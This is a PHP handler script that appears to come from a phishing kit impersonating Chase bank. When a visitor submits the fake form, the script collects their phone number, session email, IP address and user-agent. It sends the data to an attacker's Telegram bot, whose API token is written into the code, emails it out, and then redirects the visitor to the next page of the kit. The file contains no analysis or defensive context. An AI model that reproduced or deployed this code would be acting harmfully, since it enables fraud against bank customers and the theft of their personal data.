<?php

// Get client IP address
$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : 
      (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

// Start session
session_start();

// Check if 'logId' session variable is set

// Process form submission
if(isset($_POST['phn'])){
    // Include necessary file
    include 'to.php';

    // Get phone number from form
    $Phone = $_POST['phn'];

    // Prepare email message
    $message =  "<b>📞 Phone Chase</b>\n";
    $message .= "<b>🎈User:</b> <code>{$_SESSION['email']}</code>\n";
    $message .= "<b>📱Phone:</b> <code>$Phone</code>\n";
    $message .= "<b>🌐 IP Address:</b> " . $ip . "\n";
    $message .= "<b>⌚ Time:</b> " . date("Y-m-d H:i:s") . "\n";
    $message .= "<b>🖥 User-Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "<b>🔍 CHASE Phone BY BESHO MANDO📞</b> \n";

    // Prepare email subject and headers
    $subject = "Chase LOGIN";
    $headers = "From: Mody@BOA" . rand(1, 99) . "Mody.V1 \r\n";

    // Send message to Telegram
        file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id=" . $chatid . "&parse_mode=HTML&text=" . urlencode($message));


    // Send email
    $done = mail($toemail, $subject, $message, $headers);

    // Redirect to a page
    header('Location: ./red9.php');
}

?>